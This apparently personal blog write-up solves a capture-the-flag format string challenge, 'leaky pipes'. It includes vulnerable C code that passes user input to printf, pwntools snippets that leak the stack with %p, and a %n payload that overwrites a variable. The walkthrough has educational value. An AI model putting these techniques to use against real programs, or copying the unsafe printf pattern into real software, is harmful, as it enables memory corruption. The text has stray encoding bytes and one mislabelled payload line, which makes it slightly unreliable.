I"Î*<h3 id="intro">Intro:</h3>
<p>Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called <code class="language-plaintext highlighter-rouge">leaky pipes</code>. Make sure to give the challenge a try before seeing this.</p>

<h3 id="challenge-file">Challenge file:</h3>
<p><a href="/assets/leakyinctfj/leaky_pipes">vuln binary</a> and 
<a href="/assets/leakyinctfj/leaky.c">vuln c code</a></p>

<h3 id="pre-requisites">Pre requisites:</h3>
<ul>
  <li>Basic understanding of how computers work.</li>
  <li>Know what format strings are.</li>
  <li>will to learn more from googling.</li>
</ul>

<h3 id="mitigations">Mitigations:</h3>

<p><img src="/assets/leakyinctfj/ss1.png" alt="" /></p>

<ul>
  <li>Most of the format string exploitation will have all the mitigations enabled.</li>
  <li>RELRO: GOT related stuff.</li>
  <li>Stack Canary: unique value stoping buffer overflow.</li>
  <li>NX: Makes the stack not excecutable.</li>
  <li>PIE: the binary will have different address during different runs.</li>
</ul>

<h3 id="sample-run">Sample run:</h3>
<p>Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.</p>

<p><img src="/assets/leakyinctfj/ss2.png" alt="" /></p>

<ul>
  <li>We can give three options (1, 2, 3) but 2 options doesnt do anything.</li>
  <li>option 1: Give an input and get same output back from the printf function.</li>
  <li>option 3: Currently unavailable since we dont have enough cash.</li>
</ul>

<h3 id="exploit-basics">Exploit Basics:</h3>
<p>Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"my name is : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"giovanni giorgio"</span><span class="p">);</span>
</code></pre></div></div>
<p>Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="c1">//buffer = user input</span>
</code></pre></div></div>

<h3 id="exploit-idea">Exploit Idea:</h3>
<p>We have to somehow go to the use_tape() Since it has our flag and another format string exploit.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">use_tape</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">experience</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
	<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>

	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
		<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

		<span class="n">printf</span><span class="p">(</span><span class="s">"Please give us your feedback!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">fgets</span><span class="p">(</span><span class="n">experience</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="n">experience</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error opening file!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>But the small caviat is we canâ€™t go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call <code class="language-plaintext highlighter-rouge">buy_repair_kit()</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">buy_repair_kit</span><span class="p">(){</span>
    <span class="k">if</span><span class="p">(</span><span class="n">bal</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
        <span class="n">use_tape</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"You do not have enough balance! :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="format-string-1">Format string 1:</h3>

<p>First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack).</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"-%p"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)</span>
</code></pre></div></div>
<p>Sending many %p with the â€˜-â€˜ acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binaryâ€™s address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)</p>

<p><img src="/assets/leakyinctfj/ss4.jpg" alt="" /></p>

<p><img src="/assets/leakyinctfj/ss3.png" alt="" /></p>

<blockquote>
  <p>fact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.</p>
</blockquote>

<p>Pick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">baladd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"bal address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="format-string-2">Format string 2:</h3>

<p>Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, i wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling.
I call the leak function and give the string to overwrite the bal variable.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p.sendline(b"%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p")
</code></pre></div></div>
<p>Let me explain in parts what it does.</p>

<h4 id="find-your-input">Find your input:</h4>
<p>While doing a format string exploit to overwrite a variable or a function addressâ€¦ Check where your input is appearing and keep note of the index.</p>

<p><img src="/assets/leakyinctfj/ss5.jpg" alt="" /></p>

<p>Here my string of <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> repeats in the index 6. Now its just a matter of overwriting the variable. Butâ€¦ wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?</p>

<p><img src="/assets/leakyinctfj/ss5.png" alt="" /></p>

<p>Yes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value.
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%99c%9$n%90c%9$n%11c%9$n"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span>
</code></pre></div></div>
:ET